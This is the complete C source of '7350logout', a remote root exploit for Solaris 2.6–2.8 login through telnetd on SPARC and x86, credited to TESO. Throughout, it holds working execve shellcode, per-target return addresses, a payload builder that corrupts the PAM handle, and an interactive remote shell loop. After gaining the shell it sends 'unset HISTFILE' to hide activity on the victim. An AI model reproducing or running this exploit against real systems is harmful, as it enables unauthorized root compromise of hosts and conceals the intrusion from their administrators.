/* 7350logout - sparc|x86/solaris login remote root exploit
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security. This includes especially the Bugtraq mailing list, the
 * www.hack.co.za website and any public exploit archive.
 *
 * The distribution restrictions cover the entire file, including this
 * header notice. (This means, you are not allowed to reproduce the header).
 *
 * (C) COPYRIGHT TESO Security, 2001
 * All Rights Reserved
 *
 *****************************************************************************
 * 2001/12/19 -scut
 *
 * offsetless version (what a brainblasting mess).
 *
 * XXX: timing seems to be somewhat relevant, since telnetd does not cleanly
 * 	flush anything to login, so we have to sleep a while. should work.
 *
 * on sol: cc -o 7 7.c -lnsl -lsocket
 */

#define	VERSION "0.7.2"

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


/* ok, here are the guts of our PAM power technique ;)
 *
 * 1. we expect this memory layout in the static .bss space:
 *    [envbuf]  0x800      environment string buffer
 *    [args]    63 * 0x04  environment pointer buffer
 *    [pamh]    0x4        pam_handle pointer
 *
 * thats all. yes.
 *
 * offsetless through triple-overlapping pam_handle struct
 * TODO: write more in-depth blarf
 */

typedef struct {
	char *			desc;		/* distribution */
	unsigned long int	args;		/* &args[0] buffer address */

	int			endianess;	/* 0 = big, 1 = little */

	unsigned char *		shellcode;
	unsigned int		shellcode_len;
	unsigned char *		shellcode_nop;	/* 4 byte nops */
} tgt_type;


/* 48 byte sparc/solaris pic execve shellcode, lsd-pl.net, thanks!
 */
unsigned char	sparc_solaris_execve[] =
	"\x20\xbf\xff\xff"	/* bn,a	<shellcode-4>	*/
	"\x20\xbf\xff\xff"	/* bn,a	<shellcode>	*/
	"\x7f\xff\xff\xff"	/* call	<shellcode+4>	*/
	"\x90\x03\xe0\x20"	/* add	%o7,32,%o0	*/
	"\x92\x02\x20\x10"	/* add	%o0,16,%o1	*/
	"\xc0\x22\x20\x08"	/* st	%g0,[%o0+8]	*/
	"\xd0\x22\x20\x10"	/* st	%o0,[%o0+16]	*/
	"\xc0\x22\x20\x14"	/* st	%g0,[%o0+20]	*/
	"\x82\x10\x20\x0b"	/* mov	0x0b,%g1	*/
	"\x91\xd0\x20\x08"	/* ta	8		*/
	"/bin/ksh";

unsigned char	sparc_nop[] =
	"\x90\x1b\x80\x0e";	/* xor	%sp, %sp, %o0	*/


/* 42 byte x86/solaris execve shellcode
 * unknown author (kudos to him ! :)
 */
unsigned char	x86_solaris_execve[] =
	"\xeb\x1b"	/* jmp	*/
	"\x33\xd2"	/* xorl    %edx,%edx		*/
	"\x58"		/* popl    %eax			*/
	"\x8d\x78\x14"	/* leal    0x14(%eax),edi	*/
	"\x52"		/* pushl   %edx			*/
	"\x57"		/* pushl   %edi			*/
	"\x50"		/* pushl   %eax			*/
	"\xab"		/* stosl   %eax,%es:(%edi)	*/
	"\x92"		/* xchgl   %eax,%edx		*/
	"\xab"		/* stosl   %eax,%es:(%edi)	*/
	"\x88\x42\x08"	/* movb    %al,0x8(%edx)	*/
	"\x83\xef\x3c"	/* subl    $0x3c,%edi		*/
	"\xb0\x9a"	/* movb    $0x9a,%al		*/
	"\xab"		/* stosl   %eax,%es:(%edi)	*/
	"\x47"		/* incl    %edi			*/
	"\xb0\x07"	/* movb    $0x7,%al		*/
	"\xab"		/* stosl   %eax,%es:(%edi)	*/
	"\xb0\x3b"	/* movb    $0x3b,%al		*/
	"\xe8\xe0\xff\xff\xff"	/* call			*/
	"/bin/ksh";

unsigned char	x86_nop[] =
	"\x90\x90\x90\x90";	/* TODO: replace with something innocent */


#define	SH_INIT	"unset HISTFILE;id;uname -a;uptime;\n"


tgt_type targets[] = {
	{ "Solaris 2.6|2.7|2.8 sparc", 0x00027600, 0,
		sparc_solaris_execve, sizeof (sparc_solaris_execve) - 1,
       		sparc_nop },
	{ "Solaris 2.6|2.7|2.8 x86", /* .bss */ 0x0804f918 + 0x800, 1,
		x86_solaris_execve, sizeof (x86_solaris_execve) - 1,
		x86_nop },
#if 0
/* solaris 2.4 uses libauth, a libpam precessor, which looks different.
 * i suppose it would be possible to make this technique work with libauth,
 * but its not worth the effort (though they look very similar)
	{ "Solaris 2.4 SPARC", 0x00026e78,
		sparc_solaris_execve, sizeof (sparc_solaris_execve) - 1 },
*/
	{ "Solaris 2.6 SPARC", 0x00027620,
		sparc_solaris_execve, sizeof (sparc_solaris_execve) - 1 },
	{ "Solaris 2.7|2.8 SPARC", 0x000275c0,
		sparc_solaris_execve, sizeof (sparc_solaris_execve) - 1 },
#endif
	{ NULL, 0x00000000, 0, NULL, 0, NULL },
};

tgt_type target_manual_sparc = {
	"Manual target sparc", 0x0, 0,
	sparc_solaris_execve, sizeof (sparc_solaris_execve) - 1,
	sparc_nop
};

tgt_type target_manual_x86 = {
	"Manual target x86", 0x0, 0,
	x86_solaris_execve, sizeof (x86_solaris_execve) - 1,
	x86_nop
};

unsigned char		manual_type;
unsigned long int	manual_args = 0x0;

char *	dest = "127.0.0.1";	/* can be changed with -d */
int	xp_final = 0,
	verbose = 0,
	debug = 0,
	ttyp = 0;	/* force "TTYPROMPT" environment */


/* prototypes
 */

void usage (char *progname);
void shell (int sock);
void hexdump (char *desc, unsigned char *data, unsigned int amount);
void exploit (int fd);
void exploit_setenv (int fd, unsigned char *var, unsigned char *val);
unsigned int exploit_pam (unsigned char *ww);
unsigned int exploit_nopscode (unsigned char *ww, unsigned long playsize);
unsigned int exploit_addstring (unsigned char *ww, unsigned char *str);
unsigned int exploit_addbuf (unsigned char *ww, unsigned char *buf,
	unsigned int buf_len);
unsigned int exploit_addbufquot (unsigned char *ww, unsigned char *buf,
	unsigned int buf_len);
unsigned int exploit_addchars (unsigned char *ww, unsigned char wc,
	unsigned int count);
unsigned int exploit_addraw (unsigned char *ww, unsigned char wc);
unsigned int exploit_addchar (unsigned char *ww, unsigned char wc);
unsigned int exploit_addptrs (unsigned char *ww, unsigned long int ptr,
	unsigned int count);
unsigned int exploit_addptr (unsigned char *ww, unsigned long int ptr);
ssize_t telnet_prompt (int fd, unsigned char *inbuf, unsigned int inbufsize,
	char *prompt);
unsigned char * binstrstr (unsigned char *binary, unsigned int bin_len,
	unsigned char *str);
ssize_t telnet_read (int fd, unsigned char *inbuf, unsigned int inbufsize);
int telnet_eatall (int fd, unsigned char *inbuf, unsigned int inbuf_len);
void telnet_send (int fd, unsigned char type, unsigned char option);
void tgt_list (void);
unsigned long int net_resolve (char *host);
int net_connect (struct sockaddr_in *cs, char *server,
	unsigned short int port, int sec);
int net_rtimeout (int fd, int sec);
int nwrite (int fd, unsigned char *ptr, unsigned int len);



void
usage (char *progname)
{
	fprintf (stderr, "usage: %s [-h] [-v] [-D] [-T] [-p] [-t num] [-a addr] "
		"[-d dst]\n\n", progname);

	fprintf (stderr, "-h\tdisplay this usage\n"
		"-v\tincrease verbosity\n"
		"-D\tDEBUG mode\n"
		"-T\tTTYPROMPT mode (try when normal mode fails)\n"
		"-p\tspawn ttyloop directly (use when problem arise)\n"
		"-t num\tselect target type (zero for list)\n"
		"-a a\tacp option: set &args[0]. format: \"[sx]:0x123\"\n"
			"\t(manual offset, try 0x26500-0x28500, "
			"in 0x600 steps)\n"
		"-d dst\tdestination ip or fqhn (default: 127.0.0.1)\n\n");

	exit (EXIT_FAILURE);
}


int		fastprompt = 0;
tgt_type *	tgt = NULL;

int
main (int argc, char *argv[])
{
	int		fd,
			tgt_num = -1;
	char		c;
	char *		progname;
	unsigned char	rbuf[4096];


#ifndef	NOTAG
	fprintf (stderr, "7350logout - sparc|x86/solaris login remote root "
		"(version "VERSION") -sc.\n"
		"team teso.\n\n");
#endif

	progname = argv[0];
	if (argc < 2)
		usage (progname);


	while ((c = getopt (argc, argv, "ht:vDTpa:d:")) != EOF) {
		switch (c) {
		case 'h':
			usage (progname);
			break;
		case 't':
			if (sscanf (optarg, "%u", &tgt_num) != 1)
				usage (progname);
			break;
		case 'v':
			verbose += 1;
			break;
		case 'T':
			ttyp = 1;
			break;
		case 'D':
			debug = 1;
			break;
		case 'p':
			fastprompt = 1;
			break;
		case 'a':
			if (sscanf (optarg, "%c:0x%lx", &manual_type,
				&manual_args) != 1)
			{
				fprintf (stderr, "give args address in [sx]:0x123 "
					"format, dumb pentester!\n");
				exit (EXIT_FAILURE);
			}
			break;
		case 'd':
			dest = optarg;
			break;
		default:
			usage (progname);
			break;
		}
	}

	if (manual_args != 0) {
		if (manual_type == 's') {
			tgt = &target_manual_sparc;
		} else if (manual_type == 'x') {
			tgt = &target_manual_x86;
		} else {
			fprintf (stderr, "invalid [sx] manual target\n");
			exit (EXIT_FAILURE);
		}

		tgt->args = manual_args;
	} else if (tgt_num <= 0 ||
		(tgt_num >= (sizeof (targets) / sizeof (tgt_type))))
	{
		if (tgt_num != 0)
			printf ("WARNING: target out of list. list:\n\n");

		tgt_list ();

		exit (EXIT_SUCCESS);
	} else if (tgt == NULL)
		tgt = &targets[tgt_num - 1];

	fprintf (stderr, "# using target: %s\n", tgt->desc);

	fd = net_connect (NULL, dest, 23, 20);
	if (fd <= 0) {
		fprintf (stderr, "failed to connect\n");
		exit (EXIT_FAILURE);
	}

	if (ttyp) {
		fprintf (stderr, "# setting TTYPROMPT\n");
		exploit_setenv (fd, "TTYPROMPT", "gera");
	}

	/* catch initial telnet option processing, then wait for "login: "
	 * prompt to appear
	 */
	telnet_prompt (fd, rbuf, sizeof (rbuf), "login: ");
	fprintf (stderr, "# detected first login prompt\n");

	/* send one initial login attempt (to set pamh)
	 */
	write (fd, "foo 7350\n", 9);
	sleep (1);
	write (fd, "pass\n", 5);
	sleep (1);

	telnet_prompt (fd, rbuf, sizeof (rbuf), "login: ");
	fprintf (stderr, "# detected second login prompt\n");

	if (debug) {
		fprintf (stderr, "### attach and press enter!\n");
		getchar ();
	}
	exploit (fd);
	fprintf (stderr,
		"# send long login bait, waiting for password prompt\n");
	xp_final = 1;

	if (fastprompt || debug) {
		fprintf (stderr, "# press enter at the prompt\n");
	} else {
		telnet_prompt (fd, rbuf, sizeof (rbuf), "Password: ");
		fprintf (stderr, "# received password prompt, success?\n");
		write (fd, "7350\n", 5);

		fprintf (stderr, "# waiting for shell "
			"(more than 15s hanging = failure)\n");
		telnet_prompt (fd, rbuf, sizeof (rbuf), "#");

		fprintf (stderr,
			"# detected shell prompt, successful exploitation\n");
		fprintf (stderr, "###########################################"
			"################################\n");
		
		write (fd, SH_INIT, strlen (SH_INIT));
	}

	shell (fd);

	exit (EXIT_SUCCESS);
}


unsigned int	envcount;
#define	MAXARGS	63

void
exploit (int fd)
{
	int		n;
	unsigned char *	ww;		/* wbuf walker */
	unsigned char	wbuf[16384];
	unsigned long	retaddr;	/* where to return to */
	unsigned long	padenv;


	envcount = 0;
	memset (wbuf, '\x00', sizeof (wbuf));
	ww = &wbuf[0];

	/* login name
	 */
	ww += exploit_addstring (ww, "sP!");
	ww += exploit_addraw (ww, '\x20');

	/* 1. env: with return address
	 * retaddr is exact known middle of envbuf for given target,
	 * so it will most likely be correct for unknown targets, too.
	 * we have a total of 0x680(-1) bytes of playground.
	 */
	retaddr = tgt->args - 0x0800 + (64 * 2) + 0x340
		- 24 ;	/* - 24 = shellcode_len / 2, padded up to next %4=0 */

	fprintf (stderr, "# returning into 0x%08lx\n", retaddr);
	if (debug)
		ww += exploit_addptr (ww, 0x41414140);
	else
		ww += exploit_addptr (ww, retaddr);
	ww += exploit_addraw (ww, '\x20');

	/* 2. - 61. env just bogus data.
	 * TODO: maybe find a valid 0x00mm00mm opcode so this is real
	 *       nopspace, too.
	 *
	 * - 1 = login name
	 * - 1 = retaddr data
	 * - 1 = pad
	 */
	for (n = 0 ; n < MAXARGS - 1 - 1 - 1 ; ++n) {
		ww += exploit_addchar (ww, 'a');
		ww += exploit_addraw (ww, '\x20');
	}

	/* %4=0 padding before nops + shellcode
	 */
	padenv = 4 - (envcount % 4);
	ww += exploit_addchars (ww, 'P', padenv);

	/* 63. nopspace + shellcode, padding before
	 */
	padenv = 0x700 - envcount;	/* real bytes */
	padenv -= 1;			/* minus terminating NUL char */
	if (verbose > 2) {
		fprintf (stderr, "envcount = %d (0x%x)\n", envcount, envcount);
		fprintf (stderr, "padding with %ld (0x%lx) chars\n",
			padenv, padenv);
	}

	if (debug)
		ww += exploit_addchars (ww, '7', padenv);
	else
		ww += exploit_nopscode (ww, padenv);

	ww += exploit_addraw (ww, '\x20');


	/* 64. pamh, minimal survive-header, then NUL padding
	 *     align so that pameptr is the 65'th pointer, yay!
	 */
	ww += exploit_pam (ww);
	padenv = 0x7e8 + 4 - envcount;
	padenv -= 1;
	ww += exploit_addchars (ww, '\x00', padenv);
	ww += exploit_addraw (ww, '\x20');

	/* 65. pameptr
	 */
	ww += exploit_addstring (ww, "7350");

	*ww++ = '\n';

	n = ww - &wbuf[0];

	if (verbose >= 2)
		hexdump ("WIRE-BUFFER", wbuf, n);

	nwrite (fd, wbuf, n);
}

/* 854! ;)
 */
void
exploit_setenv (int fd, unsigned char *var, unsigned char *val)
{
	int		n = 0;
	unsigned char	buf[2048];

	buf[n++] = IAC;
	buf[n++] = SB;
	buf[n++] = TELOPT_NEW_ENVIRON;
	buf[n++] = TELQUAL_IS;
	buf[n++] = ENV_USERVAR;

	/* should not contain < 0x04 */
	while (*var) {
		if (*var == IAC)
			buf[n++] = *var;
		buf[n++] = *var++;
	}
	buf[n++] = NEW_ENV_VALUE;
	while (*val) {
		if (*val == IAC)
			buf[n++] = *val;
		buf[n++] = *val++;
	}
	buf[n++] = IAC;
	buf[n++] = SE;

	if (send (fd, buf, n, 0) != n) {
		perror ("xp_setenv:send");
		exit (EXIT_FAILURE);
	}
}


#define	PAM_USER	2
#define	PAM_MAX_ITEMS	64

unsigned int
exploit_pam (unsigned char *ww)
{
	unsigned int	n;
	unsigned char *	wwo = ww;
	unsigned long	no_nul_addr;


	/* we need to set pam_user to a string != "\0" (else we have some
	 * side effects in the malloc functions/strdup, don't ask). hence we
	 * use the same address as we used for retaddr, as there is no NUL
	 * byte for sure.
	 */
	no_nul_addr = tgt->args - 0x0800 + (64 * 2) + 0x340
		- 24 ;	/* - 24 = shellcode_len / 2, padded up to next %4=0 */

	/* add pam_item ps_item[PAM_MAX_ITEMS] structures */
	for (n = 0 ; n < PAM_USER + 1 ; ++n) {
		if (n == PAM_USER) {
			ww += exploit_addptr (ww, no_nul_addr);
			ww += exploit_addptr (ww, 0x00000001);
		} else {
			ww += exploit_addchars (ww, '\x00', 8);
		}
	}

	return (ww - wwo);
}


/* exploit_nopscode
 *
 * create a nop + shellcode space of `playsize' bytes in raw length.
 * then encode buffer to `ww'. the output buffer must have the size
 * of `playsize', so padding is our duty (not the space though).
 *
 * return length of encoded output (can be larger than playsize)
 */

unsigned int
exploit_nopscode (unsigned char *ww, unsigned long playsize)
{
	unsigned int		scw;	/* shellcode walker */
	unsigned char *		wwo = ww;
	unsigned char *		cbuf = calloc (1, playsize);
	unsigned long int	sizepad = playsize & ~3;


	/* what we do not overwrite is padding
	 */
	memset (cbuf, 'P', playsize);
	if (sizepad < tgt->shellcode_len) {
		fprintf (stderr, "no room to store shellcode (%lu bytes "
			"given, %u needed)\n", sizepad, tgt->shellcode_len);
		
		exit (EXIT_FAILURE);
	}
	sizepad -= tgt->shellcode_len;

	for (scw = 0 ; scw < sizepad ; scw += 4)
		memcpy (&cbuf[scw], tgt->shellcode_nop, 4);
	memcpy (&cbuf[sizepad], tgt->shellcode, tgt->shellcode_len);

	/* encode to output
	 */
	ww += exploit_addbuf (ww, cbuf, playsize);

	if (verbose >= 2)
		hexdump ("CODE-BUFFER", cbuf, playsize);

	free (cbuf);

	return (ww - wwo);
}


unsigned int
exploit_addstring (unsigned char *ww, unsigned char *str)
{
	unsigned char *	wwo = ww;

	ww += exploit_addbuf (ww, str, strlen (str));

	return (ww - wwo);
}


unsigned int
exploit_addbuf (unsigned char *ww, unsigned char *buf, unsigned int buf_len)
{
	unsigned char *	wwo = ww;

	for ( ; buf_len > 0 ; ++buf, --buf_len)
		ww += exploit_addchar (ww, *buf);

	return (ww - wwo);
}


unsigned int
exploit_addbufquot (unsigned char *ww, unsigned char *buf,
	unsigned int buf_len)
{
	unsigned char	wc;
	unsigned char *	wwo;

	for (wwo = ww ; buf_len > 0 ; --buf_len, ++buf) {
		wc = *buf;

		*ww++ = '\\';
		*ww++ = ((wc & 0300) >> 6) + '0';
		*ww++ = ((wc & 0070) >> 3) + '0';
		*ww++ = (wc & 0007) + '0';
		envcount += 1;
	}

	return (ww - wwo);
}


unsigned int
exploit_addchars (unsigned char *ww, unsigned char wc, unsigned int count)
{
	unsigned char *	wwo;

	for (wwo = ww ; count > 0 ; --count) {
		ww += exploit_addchar (ww, wc);
	}

	return (ww - wwo);
}


unsigned int
exploit_addraw (unsigned char *ww, unsigned char wc)
{
	if (wc == '\x20' || *ww == '\x09')
		envcount += 1;

	*ww = wc;

	return (1);
}


unsigned int
exploit_addchar (unsigned char *ww, unsigned char wc)
{
	unsigned char *	wwo = ww;

	switch (wc) {
	case ('\\'):
		*ww++ = '\\';
		*ww++ = '\\';
		break;
	case (0xff):
	case ('\n'):
	case (' '):
	case ('\t'):
		*ww++ = '\\';
		*ww++ = ((wc & 0300) >> 6) + '0';
		*ww++ = ((wc & 0070) >> 3) + '0';
		*ww++ = (wc & 0007) + '0';
		break;
	default:
		*ww++ = wc;
		break;
	}

	envcount += 1;

	return (ww - wwo);
}


unsigned int
exploit_addptrs (unsigned char *ww, unsigned long int ptr, unsigned int count)
{
	unsigned char *	wwo;

	for (wwo = ww ; count > 0 ; --count) {
		ww += exploit_addptr (ww, ptr);
	}

	return (ww - wwo);
}


unsigned int
exploit_addptr (unsigned char *ww, unsigned long int ptr)
{
	unsigned char *	wwo = ww;

	if (tgt->endianess == 0) {
		/* big endian */
		ww += exploit_addchar (ww, (ptr >> 24) & 0xff);
		ww += exploit_addchar (ww, (ptr >> 16) & 0xff);
		ww += exploit_addchar (ww, (ptr >> 8) & 0xff);
		ww += exploit_addchar (ww, ptr & 0xff);
	} else if (tgt->endianess == 1) {
		/* little endian */
		ww += exploit_addchar (ww, ptr & 0xff);
		ww += exploit_addchar (ww, (ptr >> 8) & 0xff);
		ww += exploit_addchar (ww, (ptr >> 16) & 0xff);
		ww += exploit_addchar (ww, (ptr >> 24) & 0xff);
	}

	return (ww - wwo);
}


/* telnet_prompt
 *
 * loop in telnet i/o until a prompt appears, given by `prompt' parameter
 * else behave as telnet_read would
 */

ssize_t
telnet_prompt (int fd, unsigned char *inbuf, unsigned int inbufsize,
	char *prompt)
{
	ssize_t	rtemp;


	do {
		rtemp = telnet_read (fd, inbuf, inbufsize);
		if (rtemp == 0) {
			if (xp_final == 0) {
				fprintf (stderr, "failed telnet_prompt.\n");
			} else {
				fprintf (stderr, "\nfailed exploitation. possible causes:\n"
					"# 1. login patched\n"
					"# 2. wrong target type (sparc|x86)\n"
					"# 3. weird/no solaris version <= 2.4\n"
					"# 4. TTYPROMPT weirdness, try again with -T option\n"
					"# 5. try with -p -v options\n\n"
					"good luck.\n");
			}

			exit (EXIT_FAILURE);
		}

		if (verbose >= 2) {
			fprintf (stderr, "rbuf: ");
			write (2, inbuf, rtemp);
		}
	} while (ttyp == 0 && binstrstr (inbuf, rtemp, prompt) == NULL);

	return (rtemp);
}


unsigned char *
binstrstr (unsigned char *binary, unsigned int bin_len, unsigned char *str)
{
	if (bin_len < strlen (str))
		return (NULL);

	while (binary <= (binary + bin_len - strlen (str))) {
		if (memcmp (binary, str, strlen (str)) == 0)
			return (binary);

		binary += 1;
		bin_len -= 1;
	}

	return (NULL);
}


/* telnet_read
 *
 * read() function that takes care of all the telnet option negotiation crap
 *
 * return value just like read()
 */

ssize_t
telnet_read (int fd, unsigned char *inbuf, unsigned int inbufsize)
{
	ssize_t			rc = 1;
	int			idleflag,
				atecount = 1;


	while (atecount != 0 && (idleflag = net_rtimeout (fd, 15)) == 1) {
		rc = read (fd, inbuf, inbufsize);
		if (verbose && rc > 0)
			hexdump ("from wire", inbuf, rc);
		atecount = telnet_eatall (fd, inbuf, rc);
		rc -= atecount;
		if (verbose && rc > 0)
			hexdump ("after processing", inbuf, rc);
		if (rc > 0)
			return (rc);
	}

	fprintf (stderr, "# telnetd either died or invalid response\n");

	return (rc);
}


/* telnet_eatall
 *
 * eat all telnet negotiation stuff and answer it, so we get through.
 * basically copied 1:1 from netcat.
 */

int
telnet_eatall (int fd, unsigned char *inbuf, unsigned int inbuf_len)
{
	int	eat;
	int	changed;


	for (eat = 0 ; inbuf_len > 2 ; ++inbuf, --inbuf_len) {
		changed = 0;

		if (inbuf[0] != IAC || inbuf_len < 2)
			continue;

		if (inbuf[1] == WILL && inbuf[2] == TELOPT_SGA) {
			inbuf[1] = DO;	/* IAC WILL SUPPRESSGOAHEAD, DO IT! */
			changed = 1;
		} else if (inbuf[1] == WILL && inbuf[2] == TELOPT_ECHO) {
			inbuf[1] = DO;	/* IAC WILL ECHO, DO IT! */
			changed = 1;
		} else
		if (inbuf[1] == WILL || inbuf[1] == WONT) {
			inbuf[1] = DONT;
			changed = 1;
		} else if (inbuf[1] == DO || inbuf[1] == DONT) {
			inbuf[1] = WONT;
			changed = 1;
		}
		if (changed)
			write (fd, inbuf, 3);

		if (inbuf_len > 3)
			memmove (&inbuf[0], &inbuf[3], inbuf_len - 3);

		--inbuf;
		inbuf_len -= 2;
		eat += 3;
	}

	return (eat);
}


void
telnet_send (int fd, unsigned char type, unsigned char option)
{
	unsigned char	buf[3];

	buf[0] = IAC;
	buf[1] = type;
	buf[2] = option;

	write (fd, buf, sizeof (buf));
}


void
tgt_list (void)
{
	int	tgt_num;


	printf ("num . description\n");
	printf ("----+-----------------------------------------------"
		"--------\n");

	for (tgt_num = 0 ; targets[tgt_num].desc != NULL ; ++tgt_num) {
		printf ("%3d | %s\n", tgt_num + 1, targets[tgt_num].desc);

		if (verbose)
			printf ("    :    0x%08lx\n", targets[tgt_num].args);
	}
	printf ("    '\n");

	return;
}


void
shell (int sock)
{
	int	l;
	char	buf[512];
	fd_set	rfds;


	while (1) {
		FD_SET (0, &rfds);
		FD_SET (sock, &rfds);

		select (sock + 1, &rfds, NULL, NULL, NULL);
		if (FD_ISSET (0, &rfds)) {
			l = read (0, buf, sizeof (buf));
			if (l <= 0) {
				perror ("read user");
				exit (EXIT_FAILURE);
			}
			write (sock, buf, l);
		}

		if (FD_ISSET (sock, &rfds)) {
			l = telnet_read (sock, buf, sizeof (buf));
			if (l <= 0) {
				perror ("read remote");
				exit (EXIT_FAILURE);
			}
			write (1, buf, l);
		}
	}
}


/* ripped from zodiac */
void
hexdump (char *desc, unsigned char *data, unsigned int amount)
{
	unsigned int	dp, p;	/* data pointer */
	const char	trans[] =
		"................................ !\"#$%&'()*+,-./0123456789"
		":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm"
		"nopqrstuvwxyz{|}~...................................."
		"....................................................."
		"........................................";


	printf ("/* %s, %u bytes */\n", desc, amount);

	for (dp = 1; dp <= amount; dp++) {
		fprintf (stderr, "%02x ", data[dp-1]);
		if ((dp % 8) == 0)
			fprintf (stderr, " ");
		if ((dp % 16) == 0) {
			fprintf (stderr, "| ");
			p = dp;
			for (dp -= 16; dp < p; dp++)
				fprintf (stderr, "%c", trans[data[dp]]);
			fflush (stderr);
			fprintf (stderr, "\n");
		}
		fflush (stderr);
	}
	if ((amount % 16) != 0) {
		p = dp = 16 - (amount % 16);
		for (dp = p; dp > 0; dp--) {
			fprintf (stderr, "   ");
			if (((dp % 8) == 0) && (p != 8))
				fprintf (stderr, " ");
			fflush (stderr);
		}
		fprintf (stderr, " | ");
		for (dp = (amount - (16 - p)); dp < amount; dp++)
			fprintf (stderr, "%c", trans[data[dp]]);
		fflush (stderr);
	}
	fprintf (stderr, "\n");

	return;
}



unsigned long int
net_resolve (char *host)
{
	long		i;
	struct hostent	*he;

	i = inet_addr(host);
	if (i == -1) {
		he = gethostbyname(host);
		if (he == NULL) {
			return (0);
		} else {
			return (*(unsigned long *) he->h_addr);
		}
	}
	return (i);
}


int
net_connect (struct sockaddr_in *cs, char *server,
	unsigned short int port, int sec)
{
	int			n,
				len,
				error,
				flags;
	int			fd;
	struct timeval		tv;
	fd_set			rset, wset;
	struct sockaddr_in	csa;

	if (cs == NULL)
		cs = &csa;

	/* first allocate a socket */
	cs->sin_family = AF_INET;
	cs->sin_port = htons (port);
	fd = socket (cs->sin_family, SOCK_STREAM, 0);
	if (fd == -1)
		return (-1);

	if (!(cs->sin_addr.s_addr = net_resolve (server))) {
		close (fd);
		return (-1);
	}

	flags = fcntl (fd, F_GETFL, 0);
	if (flags == -1) {
		close (fd);
		return (-1);
	}
	n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
	if (n == -1) {
		close (fd);
		return (-1);
	}

	error = 0;

	n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
	if (n < 0) {
		if (errno != EINPROGRESS) {
			close (fd);
			return (-1);
		}
	}
	if (n == 0)
		goto done;

	FD_ZERO(&rset);
	FD_ZERO(&wset);
	FD_SET(fd, &rset);
	FD_SET(fd, &wset);
	tv.tv_sec = sec;
	tv.tv_usec = 0;

	n = select(fd + 1, &rset, &wset, NULL, &tv);
	if (n == 0) {
		close(fd);
		errno = ETIMEDOUT;
		return (-1);
	}
	if (n == -1)
		return (-1);

	if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
		if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
			len = sizeof(error);
			if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
				errno = ETIMEDOUT;
				return (-1);
			}
			if (error == 0) {
				goto done;
			} else {
				errno = error;
				return (-1);
			}
		}
	} else
		return (-1);

done:
	n = fcntl(fd, F_SETFL, flags);
	if (n == -1)
		return (-1);
	return (fd);
}


int
net_rtimeout (int fd, int sec)
{
	fd_set		rset;
	struct timeval	tv;
	int		n, error, flags;

	error = 0;
	flags = fcntl(fd, F_GETFL, 0);
	n = fcntl(fd, F_SETFL, flags | O_NONBLOCK);
	if (n == -1)
		return (-1);

	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	tv.tv_sec = sec;
	tv.tv_usec = 0;

	/* now we wait until more data is received then the tcp low level watermark,
	 * which should be setted to 1 in this case (1 is default)
	 */

	n = select(fd + 1, &rset, NULL, NULL, &tv);
	if (n == 0) {
		n = fcntl(fd, F_SETFL, flags);
		if (n == -1)
			return (-1);
		errno = ETIMEDOUT;
		return (-1);
	}
	if (n == -1) {
		return (-1);
	}
	/* socket readable ? */
	if (FD_ISSET(fd, &rset)) {
		n = fcntl(fd, F_SETFL, flags);
		if (n == -1)
			return (-1);
		return (1);
	} else {
		n = fcntl(fd, F_SETFL, flags);
		if (n == -1)
			return (-1);
		errno = ETIMEDOUT;
		return (-1);
	}
}


int
nwrite (int fd, unsigned char *ptr, unsigned int len)
{
	ssize_t		retval,
			nwr = 0;
	int		ff_count,
			pw, tw;
	unsigned char *	sbuf;


	for (ff_count = 0, sbuf = ptr ; sbuf < &ptr[len] ; ++sbuf)
		if (*sbuf == 0xff)
			ff_count++;

	sbuf = malloc (len + ff_count);
	for (pw = tw = 0 ; pw < len ; ++pw, ++tw) {
		sbuf[tw] = ptr[pw];
		if (ptr[pw] == 0xff)
			sbuf[++tw] = ptr[pw];
	}
	ptr = sbuf;
	len = tw;

	if (verbose)
		hexdump ("to wire", ptr, len);

	while (len > 0) {
		telnet_send (fd, WONT, TELOPT_BINARY);
		telnet_send (fd, WILL, TELOPT_BINARY);
		fprintf (stderr, "#");
		usleep (1000000);

		retval = write (fd, ptr, len > 0x100 ? 0x100 : len);
		if (retval <= 0)
			return (retval);
		if (verbose >= 2) {
			fprintf (stderr, "first,second: %02x %02x   "
				"2last,last: %02x %02x\n",
				ptr[0], ptr[1],
				ptr[retval - 2], ptr[retval - 1]);
		}
		
		ptr += retval;
		len -= retval;
		nwr += retval;
	}

	fprintf (stderr, "\n");
	return (nwr);
}

